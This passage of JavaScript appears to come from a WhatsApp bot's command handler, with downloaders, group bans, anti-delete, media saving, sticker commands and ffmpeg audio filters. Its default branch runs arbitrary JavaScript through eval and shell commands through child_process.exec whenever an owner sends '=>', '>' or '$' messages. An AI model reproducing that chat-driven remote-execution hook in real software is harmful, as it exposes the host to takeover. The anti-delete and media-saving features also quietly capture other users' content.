    await m.reply(`Repository currently not available `)
  }
}
break

case 'twitter': case 'twitterdl': case 'twitterdl': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
    if (global.db.users[m.sender].banned) return m.reply(mess.ban)
	if (!args[0]) return m.reply(example(`media link`))
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return m.reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await api.twitter(args[0])
          let te = ` 
° Description: ${desc}\n\n© ᴀʀᴄʜ ᴍᴅ ²⁵`
ednut.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	m.reply(`Verify that the link is from Twitter`)
	}
}
break

  case 'banchat':
  case 'bangc':{
    if (!m.isGroup) return m.reply(mess.group)
    if (!isCreator) return m.reply(mess.owner)
    if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
    if (global.db.groups[m.chat].banned === true) return m.reply('this group has already been banned from using the bot command earlier!')
    global.db.groups[m.chat].banned = true
    m.reply(`Ban group feature enabled ${botname} won't work here!`)
    }
    break;
    

case 'autobio': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args[0] === 'on') {
if (global.db.settings.autobio === true) return m.reply('Auto bio already enabled!')
global.db.settings.autobio = true
m.reply('Auto bio enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.autobio === false) return m.reply('Auto bio already disabled!')
global.db.settings.autobio = false
m.reply('Auto bio disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'antidelete': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args[0] === 'on') {
if (global.db.settings.antidelete === true) return m.reply('Antidelete already enabled!')
global.db.settings.antidelete = true
m.reply('Antidelete enabled!')
} else if (args[0] === 'off') {
if (global.db.settings.antidelete === false) return m.reply('Antidelete already disabled!')
global.db.settings.antidelete = false
m.reply('Antidelete disabled!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'download':
case 'save':
case 'sv': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(mess.ban)
  if (!isCreator) return
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      ednut.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await ednut.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      ednut.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break

case 'unbanchat':
case 'unbangc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isCreator) return m.reply(mess.owner)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
if (global.db.groups[m.chat].banned === false) return m.reply('This group is not banned from using the bot command!')
global.db.groups[m.chat].banned = false
m.reply(`Ban group feature disabled ${botname} can now be used here!`)
}
break;

case "autosend": case "astatus": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.settings.send) return m.reply('Already on')
global.db.settings.send = true
m.reply('Autosend turned on successfully')
} else if (args[0] === "off") {
if (!global.db.settings.send) return m.reply('Already off')
global.db.settings.send = false
m.reply('Autosend turned off successfully')
}
}
break

case 'pindl': case 'img':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
   if (!text) return m.reply(example(`query 3 or url`))
    let [query, count] = text.split(' ')
    let imgCount = 5
    if (text.indexOf(' ') !== -1) {
        const lastWord = text.split(' ').pop()
        if (!isNaN(lastWord) && lastWord.trim() !== '') {
            imgCount = parseInt(lastWord)
            query = text.substring(0, text.lastIndexOf(' '))
        } else {
            query = text
        }
    } else {
        query = text
    }
    try {
        const results = await pinterest(query)
        if (results.length === 0) return m.reply(`No results found for "${query}". Try another search term.`)
        const imagesToSend = Math.min(results.length, imgCount)
        m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`)
        for (let i = 0; i < imagesToSend; i++) {
            await ednut.sendMessage(m.chat, { image: { url: results[i].image } }) 
        }
    } catch {
        m.reply('Error occurred while fetching Pinterest images. Please try again later.')
    }
}
break


case 'setcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
global.db.sticker = global.db.sticker || {}
    if (!m.quoted) return m.reply(example('reply a sticker'))
    if (!m.quoted.fileSha256) return m.reply('SHA256 Hash Missing')
    if (!text) return m.reply(example(`text`))
    let sticker = global.db.sticker
    let hash = m.quoted.fileSha256.toString('base64')
    if (sticker[hash] && sticker[hash].locked) return m.reply('You do not have permission to change this sticker command.')
    sticker[hash] = {
        text,
        mentionedJid: m.mentionedJid,
        creator: m.sender,
        at: + new Date,
        locked: false,
    }
    m.reply(`Succeess!`)
}
break

case 'delcmd':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
if (!isCreator) return m.reply(mess.owner)
let hash = text
    if (m.quoted && m.quoted.fileSha256) hash = m.quoted.fileSha256.toString('hex')
    if (!hash) return m.reply(`hash not found`)
    let sticker = global.db.sticker
    if (sticker[hash] && sticker[hash].locked) return m.reply('You dont have permission to delete this sticker command')
    delete sticker[hash]
    m.reply(`sucess`)
}
break

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(mess.ban)
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                let media = await ednut.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                ednut.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(example(`reply to an audio`))
                } catch (e) {
                m.reply(e)
                }
                break
//================= { WARNING } =================\\
    default:
        if (budy.startsWith('=>')) {
            if (!isOwner) return;
            function Return(sul) {
                sat = JSON.stringify(sul, null, 2);
                bang = util.format(sat);
                if (sat == undefined) {
                    bang = util.format(sul);
                }
                return m.reply(bang);
            }
            try {
                m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
            } catch (e) {
                m.reply(String(e));
            }
        }

        if (budy.startsWith('>')) {
            if (!isOwner) return;
            try {
                let evaled = await eval(budy.slice(2));
                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                await m.reply(evaled);
            } catch (err) {
                await m.reply(String(err));
            }
        }

        if (budy.startsWith('$')) {
            if (!isOwner) return;
            require("child_process").exec(budy.slice(2), (err, stdout) => {
                if (err) return m.reply(`${err}`);
                if (stdout) return m.reply(stdout);
            });
        }
}
    } catch (err) {
        ednut.sendMessage(ednut.user.id, {
            text: require('util').format(err)
        }, {
            quoted: m
        })
        console.log('\x1b[1;31m' + err + '\x1b[0m')
    }
}

//================= { FILE WATCHER } =================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
    delete require.cache[file]
    require(file)
})